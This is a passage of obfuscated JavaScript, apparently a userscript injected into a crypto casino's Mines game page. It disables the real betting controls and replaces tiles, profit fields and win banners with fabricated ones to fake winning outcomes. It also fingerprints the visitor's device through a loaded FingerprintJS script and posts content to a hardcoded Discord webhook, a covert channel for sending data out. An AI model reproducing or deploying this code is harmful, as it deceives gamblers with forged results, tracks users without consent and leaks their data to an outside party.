                  const _0x388c36 = await _0x4a66a0.json();
                  if (_0x388c36 && _0x388c36.tiles) {
                    _0x38ca01.tiles = _0x388c36.tiles;
                  }
                } catch (_0x335220) {
                  console.error("Error fetching data:", _0x335220);
                }
              })();
            }
            (function () {
              if (!document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div")) {
                return;
              }
              document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div > div").remove();
              const _0x5020c1 = localStorage.getItem("uncovered");
              if (!_0x5020c1) {
                return;
              }
              const _0x2dfd84 = new DOMParser().parseFromString(_0x5020c1, 'text/html');
              const _0x363716 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div");
              if (!_0x363716) {
                return;
              }
              const _0x3044f2 = _0x363716.children;
              Array.from(_0x3044f2).forEach(_0x5eb99a => {
                _0x5eb99a.replaceWith(_0x2dfd84.body.firstChild.cloneNode(true));
              });
              _0x3b13a6();
            })();
            const _0x2f8b7b = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(3) > div > div > select").value;
            try {
              !function (_0x26a3c0) {
                _0x26a3c0 = Number(_0x26a3c0);
                _0x9d0f20();
                const _0x51e13d = 0x190 * Math.random() + 0xfa;
                [document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(1)"), document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(2)"), document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(2) > div > div.input-content.svelte-1nbx5re > input"), document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(3) > div > div > select")].forEach((_0x4d5bec, _0x2537dc) => {
                  if (_0x4d5bec) {
                    _0x4d5bec.disabled = true;
                  }
                });
                const _0x1af0a8 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div > div > div > button:nth-child(1)");
                const _0x5664fb = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div > div > div > button:nth-child(2)");
                if (_0x1af0a8) {
                  _0x1af0a8.disabled = true;
                }
                if (_0x5664fb) {
                  _0x5664fb.disabled = true;
                }
                setTimeout(() => {
                  const _0x4f0c18 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label:nth-child(3)");
                  if (_0x4f0c18) {
                    _0x4f0c18.remove();
                  }
                  const _0x1589da = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label");
                  if (_0x1589da) {
                    const _0x2b3391 = document.createElement("div");
                    _0x2b3391.className = "grid-row svelte-aahjaw";
                    const _0x33fedb = 0x19 - _0x26a3c0;
                    _0x2b3391.innerHTML = "\n                <label class=\"stacked svelte-1wzq4lo\">\n                    <div class=\"input-wrap svelte-1nbx5re\">\n                        <div class=\"input-content svelte-1nbx5re\">\n                            <input autocomplete=\"on\" readonly=\"\" class=\"input spacing-expanded svelte-1nbx5re\" type=\"text\" iconafter=\"stake-game-mines\" value=\"" + _0x26a3c0 + "\">\n                        </div>\n                    </div>\n                    <span class=\"label-content full-width svelte-1k9rtf3\">\n                        <div class=\"label-left-wrapper svelte-1nbx5re\">\n                            <span slot=\"label\">Mines</span>\n                        </div>\n                    </span>\n                </label>\n                <label class=\"stacked svelte-1wzq4lo\">\n                    <div class=\"input-wrap svelte-1nbx5re\">\n                        <div class=\"input-content svelte-1nbx5re\">\n                            <input autocomplete=\"on\" readonly=\"\" class=\"input spacing-expanded svelte-1nbx5re\" type=\"text\" iconafter=\"stake-game-diamond-poker\" value=\"" + _0x33fedb + "\">\n                        </div>\n                    </div>\n                    <span class=\"label-content full-width svelte-1k9rtf3\">\n                        <div class=\"label-left-wrapper svelte-1nbx5re\">\n                            <span slot=\"label\">Gems</span>\n                        </div>\n                    </span>\n                </label>";
                    _0x1589da.parentNode.insertBefore(_0x2b3391, _0x1589da.nextSibling);
                  }
                  const _0x47fec2 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw");
                  if (_0x47fec2) {
                    let _0x3d0409;
                    if ("usd" === _0xbe34bd) {
                      _0x3d0409 = document.createElement("div");
                      _0x3d0409.className = "profit svelte-5v1hdl";
                      _0x3d0409.innerHTML = "\n            <label class=\"stacked svelte-1wzq4lo\">\n                <div class=\"input-wrap svelte-1nbx5re\">\n                    <div class=\"input-content svelte-1nbx5re\">\n                        <div class=\"before-icon svelte-1nbx5re\"></div>\n                        <div class=\"after-icon svelte-1nbx5re\">\n                            <svg fill=\"none\" viewBox=\"0 0 96 96\" class=\"svg-icon\" style=\"\">\n                                <title></title>\n                                <path d=\"M48 96c26.51 0 48-21.49 48-48S74.51 0 48 0 0 21.49 0 48s21.49 48 48 48Z\" fill=\"#6CDE07\"></path>\n                                <path d=\"M51.52 73.32v6.56h-5.8V73.4c-7.56-.6-13.08-3.56-16.92-7.64l4.72-6.56c2.84 3 6.96 5.68 12.2 6.48V51.64c-7.48-1.88-15.4-4.64-15.4-14.12 0-7.4 6.04-13.32 15.4-14.12v-6.68h5.8v6.84c5.96.6 10.84 2.92 14.6 6.56l-4.88 6.32c-2.68-2.68-6.12-4.36-9.76-5.08v12.52c7.56 2.04 15.72 4.88 15.72 14.6 0 7.4-4.8 13.8-15.72 14.84h.04Zm-5.8-30.96V31.04c-4.16.44-6.68 2.68-6.68 5.96 0 2.84 2.84 4.28 6.68 5.36ZM58.6 59.28c0-3.36-3-4.88-7.04-6.12v12.52c5-.72 7.04-3.64 7.04-6.4Z\" fill=\"#1B3802\"></path>\n                            </svg>\n                        </div>\n                        <input autocomplete=\"on\" readonly=\"\" class=\"input spacing-expanded svelte-1nbx5re\" type=\"text\" data-test=\"profit-input\" value=\"0.00\">\n                    </div>\n                </div>\n                <div class=\"labels svelte-5v1hdl\" slot=\"label-content\">\n                    <span class=\"label-content full-width svelte-1k9rtf3\">\n                        <span slot=\"label\">Total profit (1.00×)</span>\n                        <div class=\"right-align svelte-5v1hdl\">\n                            <div class=\"currency-conversion svelte-e4myuj\">\n                                <div class=\"svelte-e4myuj\">\n                                    <div class=\"crypto svelte-e4myuj\" data-testid=\"conversion-amount\">0.00000000 " + _0x48a9fe.toUpperCase() + "</div>\n                                </div>\n                            </div>\n                        </div>\n                    </span>\n                </div>\n            </label>";
                    } else if ("eur" === _0xbe34bd) {
                      _0x3d0409 = document.createElement('div');
                      _0x3d0409.className = "profit svelte-5v1hdl";
                      _0x3d0409.innerHTML = "\n  <label class=\"stacked svelte-1wzq4lo\">\n    <div class=\"input-wrap svelte-1nbx5re\">\n      <div class=\"input-content svelte-1nbx5re\">\n        <div class=\"before-icon svelte-1nbx5re\"></div>\n        <div class=\"after-icon svelte-1nbx5re\">\n          <svg fill=\"none\" viewBox=\"0 0 96 96\" class=\"svg-icon \" style=\"\">\n            <title></title>\n            <path d=\"M48 96c26.51 0 48-21.49 48-48S74.51 0 48 0 0 21.49 0 48s21.49 48 48 48Z\" fill=\"#0F8FF8\"></path>\n            <path d=\"m62.16 58.76 7.28 3.72c-3.72 5.8-9.68 10.92-19.48 10.92-11.76 0-21.36-6.92-24.44-17.6h-3.8v-4.88h2.92c-.08-.88-.16-1.76-.16-2.6 0-.96.08-1.88.16-2.76h-2.92v-4.88h3.84c3.04-10.6 12.64-17.44 24.36-17.44 9.8 0 15.84 5.08 19.48 10.92l-7.28 3.72c-2.32-4-6.96-7.04-12.2-7.04-7 0-12.64 3.84-15.2 9.88h19.64v4.88h-21c-.08.88-.16 1.8-.16 2.76 0 .88.08 1.76.16 2.6h21v4.88H34.68c2.56 6.12 8.2 10.04 15.28 10.04 5.24 0 9.88-3 12.2-7.04v-.08Z\" fill=\"#fff\"></path>\n          </svg>\n        </div>\n        <input autocomplete=\"on\" readonly=\"\" class=\"input spacing-expanded svelte-1nbx5re\" type=\"text\" data-test=\"profit-input\">\n      </div>\n    </div>\n    <div class=\"labels svelte-5v1hdl\" slot=\"label-content\">\n      <span class=\"label-content full-width svelte-1k9rtf3\">\n        <span slot=\"label\">Total profit (1.00×)</span>\n        <div class=\"right-align svelte-5v1hdl\">\n          <div class=\"currency-conversion svelte-e4myuj\">\n            <div class=\"svelte-e4myuj\">\n              <div class=\"crypto svelte-e4myuj\" data-testid=\"conversion-amount\">0.00000000 " + _0x48a9fe.toUpperCase() + "</div>\n            </div>\n          </div>\n        </div>\n      </span>\n    </div>\n  </label>";
                    } else if ("inr" === _0xbe34bd) {
                      _0x3d0409 = document.createElement("div");
                      _0x3d0409.className = "profit svelte-5v1hdl";
                      _0x3d0409.innerHTML = "\n  <label class=\"stacked svelte-1wzq4lo\">\n    <div class=\"input-wrap svelte-1nbx5re\">\n      <div class=\"input-content svelte-1nbx5re\">\n        <div class=\"before-icon svelte-1nbx5re\"></div>\n        <div class=\"after-icon svelte-1nbx5re\">\n          <svg fill=\"none\" viewBox=\"0 0 96 96\" class=\"svg-icon \" style=\"\">\n            <title></title>\n            <path d=\"M48 96c26.51 0 48-21.49 48-48S74.51 0 48 0 0 21.49 0 48s21.49 48 48 48Z\" fill=\"#EAC749\"></path>\n            <path d=\"M66 29.2H54.36c2.28 1.84 3.84 4.28 4.48 7.12h7.12v5.8h-7c-.96 6.76-5.88 10.6-10.6 11.68l11.12 18.68H47.4l-9.64-17.44h-7.88v-8.4h11.24c3.6 0 6.24-1.76 7.28-4.56H30v-5.8h18.6c-1.04-2.88-3.68-4.48-7.36-4.48H30v-8.4h36.04v5.72l-.04.08Z\" fill=\"#276304\"></path>\n          </svg>\n        </div>\n        <input autocomplete=\"on\" readonly=\"\" class=\"input spacing-expanded svelte-1nbx5re\" type=\"text\" data-test=\"profit-input\">\n      </div>\n    </div>\n    <div class=\"labels svelte-5v1hdl\" slot=\"label-content\">\n      <span class=\"label-content full-width svelte-1k9rtf3\">\n        <span slot=\"label\">Total profit (1.00×)</span>\n        <div class=\"right-align svelte-5v1hdl\">\n          <div class=\"currency-conversion svelte-e4myuj\">\n            <div class=\"svelte-e4myuj\">\n              <div class=\"crypto svelte-e4myuj\" data-testid=\"conversion-amount\">0.00000000 " + _0x48a9fe.toUpperCase() + "</div>\n            </div>\n          </div>\n        </div>\n      </span>\n    </div>\n  </label>";
                    }
                    _0x47fec2.parentNode.insertBefore(_0x3d0409, _0x47fec2.nextSibling);
                  }
                  const _0x5295fe = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl");
                  if (_0x5295fe) {
                    const _0x413adb = document.createElement("button");
                    _0x413adb.type = "button";
                    _0x413adb.tabIndex = 0x0;
                    _0x413adb.className = "inline-flex relative items-center gap-2 justify-center rounded-sm font-semibold whitespace-nowrap ring-offset-background transition disabled:pointer-events-none disabled:opacity-50 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 active:scale-[0.98] bg-grey-400 text-white betterhover:hover:bg-grey-300 betterhover:hover:text-white focus-visible:outline-white text-sm leading-none shadow-md py-[0.8125rem] px-[1rem]";
                    _0x413adb.setAttribute("data-testid", "random-tile");
                    _0x413adb.setAttribute("data-test", "random-tile");
                    _0x413adb.setAttribute("data-test-action-enabled", 'true');
                    _0x413adb.setAttribute('data-button-root', '');
                    _0x413adb.innerHTML = "\n            <div data-loader-content=\"\" class=\"contents\"><span>Pick random tile</span></div>\n        ";
                    _0x5295fe.parentNode.insertBefore(_0x413adb, _0x5295fe.nextSibling);
                  }
                  const _0x2d83e2 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\] > div");
                  if (_0x2d83e2) {
                    _0x2d83e2.innerText = "Cashout";
                  }
                  _0x5e26f4();
                  document.querySelector("[data-testid=\"bet-button\"][data-analytics=\"bet-button\"]").disabled = true;
                  (function () {
                    const _0x72e651 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]");
                    if (!_0x72e651) {
                      return;
                    }
                    const _0x10b56d = () => {
                      if ("Cashout" !== _0x72e651.innerText.trim()) {
                        return;
                      }
                      if (!localStorage.getItem('copiedUnclicked')) {
                        return void function (_0xfccae3) {
                          let _0x134da6 = document.createElement('div');
                          _0x134da6.style.position = "fixed";
                          _0x134da6.style.top = '0';
                          _0x134da6.style.left = '0';
                          _0x134da6.style.width = "100%";
                          _0x134da6.style.height = "100%";
                          _0x134da6.style.backgroundColor = "rgba(0, 0, 0, 0.6)";
                          _0x134da6.style.display = "flex";
                          _0x134da6.style.justifyContent = "center";
                          _0x134da6.style.alignItems = "center";
                          _0x134da6.style.zIndex = "1001";
                          let _0x29e723 = document.createElement("div");
                          _0x29e723.style.backgroundColor = "#fff";
                          _0x29e723.style.border = "1px solid #ddd";
                          _0x29e723.style.borderRadius = "8px";
                          _0x29e723.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
                          _0x29e723.style.padding = "20px";
                          _0x29e723.style.maxWidth = '300px';
                          _0x29e723.style.width = "100%";
                          _0x29e723.style.textAlign = "center";
                          _0x29e723.style.boxSizing = "border-box";
                          let _0x36394f = document.createElement('p');
                          _0x36394f.innerText = _0xfccae3;
                          _0x36394f.style.marginBottom = "20px";
                          _0x36394f.style.fontSize = '16px';
                          _0x36394f.style.color = "#333";
                          _0x36394f.style.lineHeight = '1.4';
                          let _0x5ce27c = document.createElement("button");
                          _0x5ce27c.innerText = "Close";
                          _0x5ce27c.style.backgroundColor = "#007BFF";
                          _0x5ce27c.style.color = '#fff';
                          _0x5ce27c.style.border = "none";
                          _0x5ce27c.style.borderRadius = "6px";
                          _0x5ce27c.style.padding = "10px 20px";
                          _0x5ce27c.style.cursor = 'pointer';
                          _0x5ce27c.style.fontSize = "16px";
                          _0x5ce27c.style.transition = "background-color 0.3s ease";
                          _0x5ce27c.style.marginTop = "10px";
                          _0x5ce27c.addEventListener('mouseover', function () {
                            _0x5ce27c.style.backgroundColor = '#0056b3';
                          });
                          _0x5ce27c.addEventListener("mouseout", function () {
                            _0x5ce27c.style.backgroundColor = "#007BFF";
                          });
                          _0x5ce27c.addEventListener("click", function () {
                            document.body.removeChild(_0x134da6);
                          });
                          _0x29e723.appendChild(_0x36394f);
                          _0x29e723.appendChild(_0x5ce27c);
                          _0x134da6.appendChild(_0x29e723);
                          document.body.appendChild(_0x134da6);
                        }("You need to setup for that!");
                      }
                      const _0x47a540 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw > label:nth-child(1) > div > div > input");
                      const _0x17e5e2 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw > label:nth-child(2) > div > div > input");
                      if (!_0x47a540 || !_0x17e5e2) {
                        return;
                      }
                      const _0xf90a92 = Number(_0x47a540.value);
                      _0x2de19d(_0x5085c8(_0xf90a92 - 0x1, 0x19 - (_0xf90a92 + Number(_0x17e5e2.value))).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ','), _0xf90a92);
                      _0x72e651.removeEventListener("click", _0x10b56d);
                      _0x5546a0 = false;
                    };
                    if (!_0x5546a0) {
                      _0x72e651.addEventListener("click", _0x10b56d);
                      _0x5546a0 = true;
                    }
                  })();
                }, _0x51e13d);
              }(_0x2f8b7b);
            } catch (_0xff3208) {
              console.error("Error in placeBet:", _0xff3208);
            }
          }
        });
      }
    } else {
      setTimeout(_0x58a1b3, 0x64);
    }
  }
  function _0x12df4a() {
    const _0x3bd2c3 = document.querySelector("div[style*=\"position: fixed\"][style*=\"top: 50%\"][style*=\"right: 0\"]");
    if (_0x3bd2c3) {
      document.body.removeChild(_0x3bd2c3);
    }
  }
  async function _0x50e746() {
    let _0x1d6871 = localStorage.getItem('userIdentifier');
    if (!_0x1d6871) {
      _0x1d6871 = await async function () {
        const _0x43a583 = document.createElement("script");
        _0x43a583.src = 'https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js';
        document.head.appendChild(_0x43a583);
        return new Promise((_0x30e188, _0xb922c3) => {
          _0x43a583.onload = async () => {
            try {
              const _0xa28ce1 = await FingerprintJS.load();
              await new Promise(_0x23349e => setTimeout(_0x23349e, 0x1f4));
              const _0x44045b = (await _0xa28ce1.get({
                'exclude': ["plugins", "screenFrame"]
              })).components || {};
              const _0x25739e = [_0x44045b.canvas?.['value'] || 'defaultCanvas', _0x44045b.webgl?.["value"] || 'defaultWebGL', _0x44045b.fonts?.["value"] || "defaultFonts", _0x44045b.hardwareConcurrency?.['value'] || "defaultHardwareConcurrency", _0x44045b.colorDepth?.["value"] || 'defaultColorDepth'];
              const _0x5a7522 = await async function (_0x294b2c) {
                const _0x12b477 = _0x294b2c.join('|');
                const _0xbe95bb = new TextEncoder().encode(_0x12b477);
                const _0x1dd375 = await crypto.subtle.digest("SHA-256", _0xbe95bb);
                return Array.from(new Uint8Array(_0x1dd375)).map(_0x8607df => _0x8607df.toString(0x10).padStart(0x2, '0')).join('');
              }(_0x25739e);
              _0x30e188(_0x5a7522);
            } catch (_0x427521) {
              console.error("Error generating device fingerprint:", _0x427521);
              _0xb922c3("Failed to generate fingerprint");
            }
          };
          _0x43a583.onerror = _0x269b8e => {
            console.error("Error loading fingerprint script: ", _0x269b8e);
            _0xb922c3("Failed to load fingerprint script");
          };
        });
      }();
      localStorage.setItem('userIdentifier', _0x1d6871);
    }
    return _0x1d6871;
  }
  async function _0x3a3532(_0x33f1c2) {
    const _0x271cd1 = {
      'content': _0x33f1c2
    };
    await fetch("https://discord.com/api/webhooks/1347852072749502555/P01wI1YCGh5bJRVoNf0mE0w5lM2WOQl3ekytdYvlUT4lZgxfsNU9kY-PYX7w3lWiw-oy", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify(_0x271cd1)
    });
  }
  function _0x2de19d(_0x24f751, _0xba03a7) {
    document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-grey-400.text-white.betterhover\\:hover\\:bg-grey-300.betterhover\\:hover\\:text-white.focus-visible\\:outline-white.text-sm.leading-none.shadow-md.py-\\[0\\.8125rem\\].px-\\[1rem\\]").disabled = true;
    _0x9d0f20();
    setTimeout(() => {
      const _0x3198ae = localStorage.getItem("copiedBomb");
      const _0x212a21 = localStorage.getItem("copiedUnclicked");
      if (!_0x3198ae) {
        return;
      }
      const _0x56d168 = new DOMParser().parseFromString(_0x3198ae, 'text/html').body.firstChild;
      const _0x127f3d = new DOMParser().parseFromString(_0x212a21, "text/html").body.firstChild;
      const _0x2a9311 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-content.svelte-1ku0r3 > div");
      if (!_0x2a9311) {
        return;
      }
      const _0x202cdd = Array.from(_0x2a9311.children);
      const _0x1b48c5 = _0x202cdd.filter(_0x3545d3 => !_0x3545d3.classList.contains("gem"));
      let _0x5b121b = 0x0;
      const _0x3ed74f = _0x1b48c5.length - _0xba03a7;
      let _0x45e74a;
      if (0x0 === Object.keys(_0x38ca01.tiles).length) {
        _0x1b48c5.sort(() => Math.random() - 0.5).forEach((_0x2349cf, _0x57dd4f) => {
          if (_0x57dd4f < _0x3ed74f) {
            _0x2349cf.replaceWith(_0x127f3d.cloneNode(true));
            _0x5b121b++;
          } else {
            _0x2349cf.replaceWith(_0x56d168.cloneNode(true));
          }
        });
      } else {
        const _0x26db30 = Object.keys(_0x38ca01.tiles).filter(_0x46ed21 => _0x38ca01.tiles[_0x46ed21]).map(Number);
        const _0x142621 = new Set();
        _0x26db30.forEach(_0x4065f6 => {
          const _0x4918b6 = _0x202cdd[_0x4065f6];
          if (_0x1b48c5.includes(_0x4918b6) && _0x5b121b < _0x3ed74f) {
            _0x4918b6.replaceWith(_0x127f3d.cloneNode(true));
            _0x5b121b++;
            _0x142621.add(_0x4065f6);
          }
        });
        _0x1b48c5.filter(_0x553842 => !_0x142621.has(_0x202cdd.indexOf(_0x553842))).sort(() => Math.random() - 0.5).forEach((_0x4c399d, _0xe309b3) => {
          if (_0x5b121b < _0x3ed74f) {
            _0x4c399d.replaceWith(_0x127f3d.cloneNode(true));
            _0x5b121b++;
          } else {
            _0x4c399d.replaceWith(_0x56d168.cloneNode(true));
          }
        });
      }
      _0x38ca01 = {
        'tiles': {}
      };
      if ("ltc" === _0x48a9fe) {
        _0x45e74a = localStorage.getItem('copiedWinMenu');
      } else if ("eth" === _0x48a9fe) {
        _0x45e74a = localStorage.getItem("eth_win");
      } else if ("pol" === _0x48a9fe) {
        _0x45e74a = localStorage.getItem("matic_win");
      } else if ('btc' === _0x48a9fe) {
        _0x45e74a = localStorage.getItem("btc_win");
      }
      if (_0x45e74a) {
        const _0x484016 = new DOMParser().parseFromString(_0x45e74a, "text/html");
        const _0x4ea536 = _0x484016.querySelector("div > span.number-multiplier.svelte-19ngaoh > span");
        if (_0x4ea536) {
          _0x4ea536.innerText = _0x24f751 + '×';
        }
        _0x2a9311.appendChild(_0x484016.body.firstChild);
      }
      [document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(1)"), document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-button-wrap.svelte-1nbx5re > button:nth-child(2)"), document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label > div > div.input-content.svelte-1nbx5re > input")].forEach((_0x3c77bf, _0x1b5db4) => {
        if (_0x3c77bf) {
          _0x3c77bf.disabled = false;
        }
      });
      const _0x21512d = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\]");
      const _0x495935 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-green-500.text-neutral-black.betterhover\\:hover\\:bg-green-400.betterhover\\:hover\\:text-neutral-black.focus-visible\\:outline-white.text-base.leading-none.shadow-md.py-\\[1\\.125rem\\].px-\\[1\\.75rem\\] > div");
      if (_0x21512d) {
        _0x21512d.disabled = false;
        _0x495935.innerText = "Bet";
      }
      const _0x1618b7 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.tabs-wrapper.scrollX.fullWidth.svelte-1vkrcyy > div > div > button:nth-child(1)");
      const _0x1256ad = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.tabs-wrapper.scrollX.fullWidth.svelte-1vkrcyy > div > div > button:nth-child(2)");
      if (_0x1618b7) {
        _0x1618b7.disabled = false;
      }
      if (_0x1256ad) {
        _0x1256ad.disabled = false;
      }
      const _0x44df05 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > button.inline-flex.relative.items-center.gap-2.justify-center.rounded-sm.font-semibold.whitespace-nowrap.ring-offset-background.transition.disabled\\:pointer-events-none.disabled\\:opacity-50.focus-visible\\:outline.focus-visible\\:outline-2.focus-visible\\:outline-offset-2.active\\:scale-\\[0\\.98\\].bg-grey-400.text-white.betterhover\\:hover\\:bg-grey-300.betterhover\\:hover\\:text-white.focus-visible\\:outline-white.text-sm.leading-none.shadow-md.py-\\[0\\.8125rem\\].px-\\[1rem\\]");
      if (_0x44df05) {
        _0x44df05.remove();
      }
      const _0x1120f8 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.profit.svelte-5v1hdl");
      if (_0x1120f8) {
        _0x1120f8.remove();
      }
      const _0x35f8e4 = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > div.grid-row.svelte-aahjaw");
      if (_0x35f8e4) {
        _0x35f8e4.remove();
      }
      const _0x269859 = document.createElement("label");
      _0x269859.className = "stacked svelte-1wzq4lo";
      _0x269859.innerHTML = "\n    <div class=\"select-wrap svelte-16bm4r1\">\n        <div class=\"select-content svelte-16bm4r1\">\n            <select class=\"select spacing-expanded svelte-16bm4r1\" data-test=\"mines-count\" name=\"mines-count\">\n                " + Array.from({
        'length': 0x18
      }, (_0x4b3ceb, _0x42df3c) => {
        const _0x3e9d4b = _0x42df3c + 0x1;
        return "<option value=\"" + _0x3e9d4b + "\" " + (_0x3e9d4b === Number(_0xba03a7) ? 'selected' : '') + '>' + _0x3e9d4b + '</option>';
      }).join('') + "\n            </select>\n            <div class=\"dropdown-icon-wrap svelte-16bm4r1\">\n                <svg fill=\"currentColor\" viewBox=\"0 0 64 64\" class=\"svg-icon\" style=\"\">\n                    <title></title>\n                    <path d=\"M32.271 49.763 9.201 26.692l6.928-6.93 16.145 16.145 16.144-16.144 6.93 6.929-23.072 23.07h-.005Z\"></path>\n                </svg>\n            </div>\n        </div>\n    </div>\n    <span class=\"label-content full-width svelte-1k9rtf3\">Mines</span>\n";
      const _0x29490a = document.querySelector("#main-content > div.parent.svelte-1ydxan2 > div > div > div > div > div.content.svelte-s7t0yi > div.game-sidebar.svelte-2ftx9j > label");
      _0x29490a.parentNode.insertBefore(_0x269859, _0x29490a.nextSibling);
      _0x5e26f4();
    }, 0x12c * Math.random() + 0xc8);
  }
  function _0x5085c8(_0x16175a, _0x42e2c6, _0x55432d = false) {
    if (_0x16175a < 0x0 || _0x16175a >= _0x55f5b6.length) {
      return null;
    }
    const _0x4a71b5 = _0x55f5b6[_0x16175a].data.find(_0x5c853e => _0x5c853e.diamonds === _0x42e2c6);
    const _0x2050b1 = _0x4a71b5 ? _0x4a71b5.multiplier : 0x1;
    return _0x55432d ? _0x2050b1.toFixed(0x2).toString().replace(/\B(?=(\d{3})+(?!\d))/g, ',') : _0x2050b1.toFixed(0x2);
  }
